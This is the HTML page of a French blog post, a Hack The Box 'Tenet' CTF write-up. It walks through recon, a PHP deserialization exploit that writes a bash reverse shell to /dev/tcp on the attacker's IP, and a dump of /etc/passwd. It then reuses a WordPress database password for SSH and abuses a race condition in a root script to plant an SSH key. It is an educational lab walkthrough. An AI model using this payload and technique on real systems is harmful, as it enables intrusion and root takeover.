@@ -1,0 +1,636 @@
+
+  
+<!doctype html>
+<html class="no-js" lang="fr">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="siteBaseUrl" content="//luksec.fr">
+    <meta name="author" content="Luks">
+    <meta name="description" content="">
+    <meta name="keywords" content="blog,personal,ctf,htb,writeup,cyber,security">
+    <meta name="generator" content="Hugo 0.78.1" />
+    <title>
+        
+           
+               Hack The Box - Tenet &vert; Luks
+           
+        
+    </title>
+    <meta name="description" content="Hack The Box - Tenet - %!s(&lt;nil&gt;)">
+    <meta itemprop="name" content="Hack The Box - Tenet">
+    <meta itemprop="description" content="Hack The Box - Tenet - %!s(&lt;nil&gt;)">
+    <meta property="og:title" content="Hack The Box - Tenet">
+    <meta property="og:description" content="Hack The Box - Tenet - %!s(&lt;nil&gt;)">
+    <meta property="og:image" content="https://www.gravatar.com/avatar/d41d8cd98f00b204e9800998ecf8427e?size=200">
+    <meta property="og:url" content="//luksec.fr/fr/article/tenet/">
+    <meta property="og:site_name" content="Luks">
+    <meta property="og:type" content="article">
+
+    
+
+
+    <script src="/modernizr-simple.js"></script>
+
+    
+    <link href="/fr/article/tenet/" rel="alternate" type="application/rss+xml" title="Luks" />
+    <link href="/fr/article/tenet/" rel="feed" type="application/rss+xml" title="Luks" />
+    
+
+    
+
+    <link rel="stylesheet" href="//luksec.fr/theme.css">
+
+    
+
+    
+        
+            <link rel="stylesheet" href="//luksec.fr/css/custom.css">
+        
+    
+</head>
+
+<body class="bilberry-hugo-theme">
+
+    
+    <nav>
+
+    <div class="container">
+        <ul class="topnav">
+            
+                
+                    <li><a href="//luksec.fr/fr/page/notes/">Notes</a></li>
+                
+            
+                
+                    <li><a href="//luksec.fr/fr/page/whoami/">Whoami</a></li>
+                
+            
+        </ul>
+
+        
+    </div>
+</nav>
+
+
+    
+    <header>
+
+        <div class="container">
+            <div class="logo" style="border: none;">
+                <a href="//luksec.fr" class="logo">
+                    
+                        <img src="/img/avatar.jpg" alt="">
+                    
+
+                    <span class="overlay"><i class="fa fa-home"></i></span>
+                </a>
+            </div>
+            <div class="titles">
+                <h3 class="title">
+                    <a href="//luksec.fr">
+                        Luks
+                    </a>
+                </h3>
+
+                
+            </div>
+
+            <div class="languages">
+                
+                    
+                        <a href="//luksec.fr/">en</a>
+                    
+                
+                    
+                        <a href="//luksec.fr/fr/" class="active">fr</a>
+                    
+                
+                </div>
+            
+
+            
+                <div class="toggler">
+            
+                    <i class="fa fa-bars" aria-hidden="true"></i>
+                </div>
+            </div>
+    </header>
+
+
+    <div class="main container">
+        
+    <div class="article-wrapper u-cf single">
+        
+            <a class="bubble" href="//luksec.fr/fr/article/tenet/">
+    <i class="fas fa-fw fa-pencil-alt"></i>
+</a>
+
+<article class="default article">
+    
+
+    <div class="content">
+    <h1 class="article-title">
+        <a href="//luksec.fr/fr/article/tenet/">
+            Hack The Box - Tenet
+        </a>
+    </h1>
+
+    <div class="meta">
+        
+            
+                <span class="date moment">2021-06-19</span>
+            
+        
+
+        
+            
+                <span class="readingTime">5 Min. lecture</span>
+            
+        
+
+        
+            <span class="categories">
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/htb/">HTB</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/ctf/">ctf</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/write-up/">write-up</a>
+                    
+                
+                    
+                    
+                        <a href="//luksec.fr/fr/categories/linux/">linux</a>
+                    
+                
+            </span>
+        
+
+        
+            <span class="author">
+                
+                
+                    <a href="//luksec.fr/fr/author/luks/">Luks</a>
+                
+            </span>
+        
+    </div>
+
+    
+        
+
+        <p><img src="/img/tenet/tenet-fiche.png" alt=""></p>
+<p>Tenet est une <a href="https://app.hackthebox.eu/machines/Tenet">machine</a> moyenne qui a été déployée sur Hack The Box le samedi 16 janvier 2021 and crée par <strong>egotisticalSW</strong>.</p>
+<h1 id="résumé-rapide">Résumé rapide</h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a>
+      <ul>
+        <li><a href="#scan-nmap">Scan Nmap</a></li>
+        <li><a href="#enumération-web">Enumération web</a></li>
+        <li><a href="#première-connexion---www-data">Première connexion - www-data</a></li>
+        <li><a href="#utilisateur-neil">Utilisateur neil</a></li>
+        <li><a href="#elévation-de-privilèges">Elévation de privilèges</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="scan-nmap">Scan Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">2048</span> cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-generator: WordPress 5.6
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Tenet
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>On retrouve :</p>
+<ul>
+<li>un service <code>SSH</code> sur le port <code>22/TCP</code></li>
+<li>un service <code>HTTP</code> sur le port <code>80/TCP</code></li>
+<li>OS Linux</li>
+</ul>
+<h3 id="enumération-web">Enumération web</h3>
+<p><img src="/img/tenet/tenet-site.png" alt=""></p>
+<p>Quand on se rend sur le site, on tombe sur un blog <code>TENET</code>, Wappalyzer révèle plusieurs infos :</p>
+<ul>
+<li>l&rsquo;OS est Ubuntu.</li>
+<li>CMS <code>Wordpress 5.6</code></li>
+<li>Backend en <code>PHP</code></li>
+<li>Bases de données en <code>MySQL</code></li>
+</ul>
+<p>En bas de la page dans les commentaires récents, on retrouve un commentaire de <code>neil</code> sur l&rsquo;article <code>Migration</code> qui demande si l&rsquo;on a supprimé le fichier <code>sator.php</code> et la sauvegarde ?</p>
+<p><img src="/img/tenet/tenet-comment.png" alt=""></p>
+<p>En essayant de trouver le fichier dans l&rsquo;URL <code>http://tenet.htb/sator.php</code> j&rsquo;obtiens une page 404.</p>
+<p><img src="/img/tenet/tenet-not.png" alt=""></p>
+<p>Mais avec l&rsquo;adresse IP, on retrouve le fichier en question</p>
+<p><img src="/img/tenet/tenet-ip.png" alt=""></p>
+<p>Après plusieurs tests, j&rsquo;arrive à télécharger le fichier en ajoutant l&rsquo;extention <code>.bak</code></p>
+<p><img src="/img/tenet/tenet-bak.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
+{
+	<span style="color:#66d9ef">public</span> $user_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;users.txt&#39;</span>;
+	<span style="color:#66d9ef">public</span> $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+
+	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update_db</span>()
+	{
+		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span>;
+		$this<span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Success&#39;</span>;
+	}
+
+
+	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
+	{
+		<span style="color:#a6e22e">file_put_contents</span>(<span style="color:#66d9ef">__DIR__</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $this <span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">user_file</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>);
+		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[] Database updated &lt;br&gt;&#39;</span>;
+	<span style="color:#75715e">//	echo &#39;Gotta get this working properly...&#39;;
+</span><span style="color:#75715e"></span>	}
+}
+
+$input <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;arepo&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$databaseupdate <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($input);
+
+$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>;
+$app <span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">update_db</span>();
+
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>L&rsquo;analyse du code indique qu&rsquo;il recherche l&rsquo;input GET <code>arepo</code> et la désérialise, on peut donc utiliser la désérialisation d&rsquo;object PHP pour obtenir une RCE à l&rsquo;aide de la fonction <code>__destruct()</code> et <code>file_put_contents</code> qui permet d&rsquo;écrire des données dans un fichier. Ici les données de la variable <code>$data</code> dans le fichier de la variable <code>$user_file</code>.</p>
+<p><code>ippsec</code> a réalisé une <a href="https://www.youtube.com/watch?v=HaW15aMzBUM">vidéo</a> détaillé sur le sujet si vous voulez comprendre le fonctionnement.</p>
+<h3 id="première-connexion---www-data">Première connexion - www-data</h3>
+<p>Pour le foothold, on place un reverse shell PHP dans la variable <code>$data</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DatabaseExport</span>
+{
+    <span style="color:#66d9ef">public</span> $user_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;luks.php&#39;</span>;
+    <span style="color:#66d9ef">public</span> $data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php exec(&#34;/bin/bash -c \&#39;bash -i &gt; /dev/tcp/10.10.14.229/1337 0&gt;&amp;1\&#39;&#34;); ?&gt;&#39;</span>;
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update_db</span>()
+    {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span>;
+        $this<span style="color:#f92672">-&gt;</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Success&#39;</span>;
+    }
+
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct()
+    {
+        <span style="color:#75715e">#file_put_contents(__DIR__ . &#39;/&#39; . $this -&gt;user_file, $this-&gt;data);
+</span><span style="color:#75715e"></span>        <span style="color:#75715e">#echo &#39;[] Database updated &lt;br&gt;&#39;;
+</span><span style="color:#75715e"></span>    <span style="color:#75715e">//    echo &#39;Gotta get this working properly...&#39;;
+</span><span style="color:#75715e"></span>    }
+}
+
+$input <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;arepo&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+$databaseupdate <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($input);
+
+$app <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DatabaseExport</span>;
+<span style="color:#66d9ef">print</span>(<span style="color:#a6e22e">urlencode</span>(<span style="color:#a6e22e">serialize</span>($app)));
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Récupération du payload</p>
+<p><img src="/img/tenet/tenet-payload.png" alt=""></p>
+<p>Mise à jour de la base de données, ouverture d&rsquo;un listener sur le port <code>1337</code> et utilisation de curl pour récupérer un shell en tant que <code>www-data</code> plus stabilisation.</p>
+<p><img src="/img/tenet/tenet-exploit.png" alt=""></p>
+<h3 id="utilisateur-neil">Utilisateur neil</h3>
+<p>Je vois qu&rsquo;il y a un utilisateur <code>neil</code> présent sur la machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@tenet:/var/www/html$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false
+neil:x:1001:1001:neil,,,:/home/neil:/bin/bash
+</code></pre></div><p>Après investigation, dans le fichier de configuration wordpress <code>wp-config.php</code> sous <code>/var/www/html/wordpress</code>, on retrouve les credentials de la base de données.</p>
+<p><img src="/img/tenet/tenet-wp-conf.png" alt=""></p>
+<p>Tentative de connexion en SSH avec les creds <code>neil:Opera2112</code>, ça fonctionne et je peux récupérer le premier flag <code>user.txt</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">uks@kali:~/infosec/htb/actives/tenet$ ssh neil@tenet.htb
+The authenticity of host <span style="color:#e6db74">&#39;tenet.htb (10.10.10.223)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:WV3NcHaV7asDFwcTNcPZvBLb3MG6RbhW9hWBQqIDwlE.
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>tenet.htb,10.10.10.223<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span><span style="color:#e6db74">neil@tenet.htb&#39;</span>s password: 
+
+-- snipp --
+
+<span style="color:#ae81ff">31</span> of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Thu Dec <span style="color:#ae81ff">17</span> 10:59:51 <span style="color:#ae81ff">2020</span> from 10.10.14.3
+neil@tenet:~$
+</code></pre></div><p><img src="/img/tenet/tenet-user.png" alt=""></p>
+<h3 id="elévation-de-privilèges">Elévation de privilèges</h3>
+<p>En tapant la commande <code>sudo -l</code>, je retrouve un fichier intéressant sous <code>/usr/local/bin/enableSSH.sh</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+checkAdded<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+	sshName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/bin/echo $key | /usr/bin/cut -d <span style="color:#e6db74">&#34; &#34;</span> -f 3<span style="color:#66d9ef">)</span>
+
+	<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -z <span style="color:#66d9ef">$(</span>/bin/grep $sshName /root/.ssh/authorized_keys<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+
+		/bin/echo <span style="color:#e6db74">&#34;Successfully added </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
+
+	<span style="color:#66d9ef">else</span>
+
+		/bin/echo <span style="color:#e6db74">&#34;Error in adding </span>$sshName<span style="color:#e6db74"> to authorized_keys file!&#34;</span>
+
+	<span style="color:#66d9ef">fi</span>
+
+<span style="color:#f92672">}</span>
+
+checkFile<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+	<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! -s $1 <span style="color:#f92672">]]</span> <span style="color:#f92672">||</span> <span style="color:#f92672">[[</span> ! -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+
+		/bin/echo <span style="color:#e6db74">&#34;Error in creating key file!&#34;</span>
+
+		<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -f $1 <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> /bin/rm $1; <span style="color:#66d9ef">fi</span>
+
+		exit <span style="color:#ae81ff">1</span>
+
+	<span style="color:#66d9ef">fi</span>
+
+<span style="color:#f92672">}</span>
+
+addKey<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+
+	tmpName<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span style="color:#66d9ef">)</span>
+
+	<span style="color:#f92672">(</span>umask 110; touch $tmpName<span style="color:#f92672">)</span>
+
+	/bin/echo $key &gt;&gt;$tmpName
+
+	checkFile $tmpName
+
+	/bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+
+	/bin/rm $tmpName
+
+<span style="color:#f92672">}</span>
+
+key<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
+addKey
+checkAdded
+</code></pre></div><p>Le script et notamment la fonction <code>addKey()</code> est intéressante, car elle permet d&rsquo;écrire une clé publique SSH dans un fichier temporaire random généré au format <code>/tmp/ssh-XXXXXXXX</code> avec la commande <a href="http://pwet.fr/man/linux/commandes/mktemp/">mktemp</a>, puis il copie le contenu du fichier dans <code>/root/.ssh/authorized_keys</code> pour enfin supprimer le fichier.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@tenet:/var/www/html$ ls -l /usr/local/bin/enableSSH.sh  
+-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1080</span> Dec  <span style="color:#ae81ff">8</span> 13:46 /usr/local/bin/enableSSH.sh
+</code></pre></div><p>On a la possibilité d&rsquo;écrire dans le fichier, je vais générer une nouvelle paire de clés SSH avec <code>ssh-keygen</code> et créer une boucle <code>while</code> infinie en bash pour bypass la <a href="https://en.wikipedia.org/wiki/Race_condition">race condition</a>. De cette manière, le script va tourner en boucle et trouver dans le répertoire <code>/tmp</code> un fichier avec le préfixe <code>ssh-</code>. On ouvre une deuxième session SSH en tant que neil pour exécuter le binaire plusieurs fois.</p>
+<p>Enfin je copie ma clé privée SSH dans le répertoire actuel, je lui assigne les droits et je peux me connecter en <code>root</code> pour récupérer le dernier flag.</p>
+<p><img src="/img/tenet/tenet-root.png" alt=""></p>
+    
+</div>
+
+    
+<div class="footer">
+
+
+    
+        <div class="tags">
+            <i class="fa fa-tags"></i>
+            <div class="links">
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/php-deserialization/">PHP deserialization</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/race-condition/">race condition</a>
+                    
+                
+                    
+                    
+                    <a href="//luksec.fr/fr/tags/web/">web</a>
+                    
+                
+            </div>
+        </div>
+    
+
+    
+    <div class="languages">
+        <i class="fa fa-language"></i>
+        <div class="links">
+            
+                <a href="//luksec.fr/article/tenet/">en</a>
+            
+        </div>
+    </div>
+    
+</div>
+
+</article>
+
+        
+    </div>
+
+    
+        <div id="comments-container">
+            
+            
+
+        </div>
+    
+
+    </div>
+
+    
+<footer>
+    <div class="container">
+
+        
+        <div class="recent-posts">
+            <strong>Derniers articles</strong>
+            <ul>
+                
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/trick/">Hack The Box - Trick</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-forensic/">FCSC 2022 - Forensic</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-web/">FCSC 2022 - Web</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/fcsc2022-intro/">FCSC 2022 - Intro</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/bountyhunter/">Hack The Box - BountyHunter</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/advuln/">Mise en place d&#39;un environnement AD vulnérable</a>
+                    </li>
+                
+                    <li>
+                        <a href="//luksec.fr/fr/article/spring4shell/">TryHackMe - Spring4shell</a>
+                    </li>
+                
+            </ul>
+        </div>
+        
+
+        
+        <div class="categories">
+            <a href="/fr/categories/"><strong>Catégories</strong></a>
+            <ul>
+                
+                <li>
+                    <a href="/fr/categories/ctf">Ctf
+                        (27)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/htb">Htb
+                        (24)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/write-up">Write up
+                        (22)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/linux">Linux
+                        (17)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/windows">Windows
+                        (4)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/fcsc">Fcsc
+                        (3)</a>
+                </li>
+                
+                <li>
+                    <a href="/fr/categories/writeup">Writeup
+                        (3)</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+
+        <div class="right">
+            
+            <div class="external-profiles">
+                <strong>Des médias sociaux</strong>
+
+                
+                <a href="https://twitter.com/luksec_" target="_blank"><i class="fab fa-twitter"></i></a>
+                
+                <a href="https://github.com/0xLuks" target="_blank"><i class="fab fa-github"></i></a>
+                
+            </div>
+            
+
+            <div class="languages">
+                <strong>Autres langues</strong>
+                
+                
+                <a href="//luksec.fr/">en</a>
+                
+                
+                
+                <a href="//luksec.fr/fr/" class="active">fr</a>
+                
+                
+                <br><br>
+                <script src="https://www.hackthebox.eu/badge/483643"></script>
+            </div>
+            
+        </div>
+    </div>
+    <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="luks" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18">
+    </script>
+</footer>
+
+
+<div class="credits">
+    <div class="container">
+        <div class="copyright">
+            <a href="https://github.com/Lednerb" target="_blank">
+                &copy;
+                
+                2022
+                
+                by Lucas L.
+            </a>
+            
+        </div>
+        <div class="author">
+            <a href="https://github.com/Lednerb/bilberry-hugo-theme"
+                target="_blank">Bilberry Hugo Theme</a>
+        </div>
+    </div>
+</div>
+
+
+    
+
+    
+
+
+    <script type="text/javascript" src="//luksec.fr/theme.js"></script>
+
+    
+    
+    
+
+    
+</body>
+
+</html>
